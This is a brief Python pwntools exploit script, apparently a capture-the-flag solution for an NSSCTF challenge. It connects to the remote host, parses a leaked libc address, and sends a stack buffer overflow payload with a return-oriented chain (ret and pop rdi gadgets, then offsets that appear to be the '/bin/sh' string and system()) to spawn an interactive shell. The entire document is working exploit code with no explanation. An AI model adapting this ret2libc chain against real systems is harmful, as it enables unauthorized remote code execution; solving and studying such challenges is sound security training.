from pwn import*

context.update(arch='amd64',os='linux')
context.log_level='debug'
rdi_ret=p64(0x4012A3)
ret=p64(0x4012A4)
p=remote('node5.anna.nssctf.cn',28248)
p.recvuntil(b'0x')
addr=int(p.recv(12),16)-0x080ed0
log.info('addr=%#x'%(addr))
payload=b'a'*264+ret+rdi_ret+p64(addr+0x1d8698)+p64(addr+0x050d60)
p.send(payload)
p.interactive()
